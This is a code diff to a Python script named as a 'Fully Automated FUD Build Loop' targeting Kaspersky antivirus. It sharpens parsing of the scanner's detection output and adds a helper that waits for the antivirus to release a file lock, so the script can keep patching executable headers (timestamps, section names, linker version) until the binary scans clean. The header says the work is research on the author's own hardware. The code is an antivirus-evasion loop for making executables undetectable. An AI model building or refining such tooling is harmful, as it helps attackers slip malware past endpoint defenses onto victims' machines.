@@ -1,4 +1,6 @@
 #!/usr/bin/env python3
+import sys
+sys.stdout.reconfigure(encoding='utf-8', errors='replace')
 """
 fud_auto.py — Fully Automated FUD Build Loop (Kaspersky)
 22DIV / george wu — CSEC research, own hardware only
@@ -81,15 +83,35 @@ def kav_scan(kavs, path):
         # recheck immediately — KAV may delete during scan
         if not os.path.exists(path):
             return "DELETED", "quarantined during scan"
-        out = (r.stdout + r.stderr).strip().lower()
-        if r.returncode == 0 and "detected" not in out and "threat" not in out:
-            return "CLEAN", ""
-        if "detected" in out or "threat" in out or "virus" in out or r.returncode in (1,2,3,4,5):
-            for line in (r.stdout + r.stderr).splitlines():
-                if any(k in line.lower() for k in ("detected","threat","virus")):
+
+        full_out = r.stdout + r.stderr
+
+        # Parse "; Total detected: N" from stats block — authoritative count
+        import re
+        m = re.search(r';\s*Total detected:\s*(\d+)', full_out, re.IGNORECASE)
+        if m:
+            total_detected = int(m.group(1))
+            if total_detected == 0:
+                return "CLEAN", f"Total detected: 0  rc={r.returncode}"
+            # Find specific detection lines (skip summary lines)
+            for line in full_out.splitlines():
+                low = line.lower()
+                if any(k in low for k in ("detected","threat","virus","malware")) \
+                        and "total detected" not in low and "stat" not in low:
                     return "DETECTED", line.strip()[:120]
-            return "DETECTED", f"rc={r.returncode}"
-        return "ERROR", f"rc={r.returncode}"
+            return "DETECTED", f"Total detected: {total_detected}  rc={r.returncode}"
+
+        # Fallback: rc=0 = clean
+        if r.returncode == 0:
+            return "CLEAN", f"rc=0"
+
+        # Non-zero rc without stats block
+        for line in full_out.splitlines():
+            low = line.lower()
+            if any(k in low for k in ("detected","threat","virus","malware")) \
+                    and "total detected" not in low:
+                return "DETECTED", line.strip()[:120]
+        return "ERROR", f"rc={r.returncode} (no stats block)"
     except subprocess.TimeoutExpired:
         return "ERROR", "timeout"
     except Exception as e:
@@ -108,8 +130,21 @@ _SECTION_NAMES = [
     b".cdata", b".sdata",  b".ndata",  b".ztext",  b".fdata",
 ]
 
+def wait_writable(path, retries=12, delay=2.5):
+    """Poll until we can open the file for writing (KAV releases lock). Returns True if writable."""
+    for _ in range(retries):
+        try:
+            with open(path, "r+b"):
+                return True
+        except PermissionError:
+            time.sleep(delay)
+    return False
+
+
 def pe_patch(path):
     """Patch PE timestamp, section names, linker minor version. In-place."""
+    if not wait_writable(path):
+        return False, "file locked — AV holding open, skipping PE patch"
     try:
         with open(path, "rb") as f:
             data = bytearray(f.read())
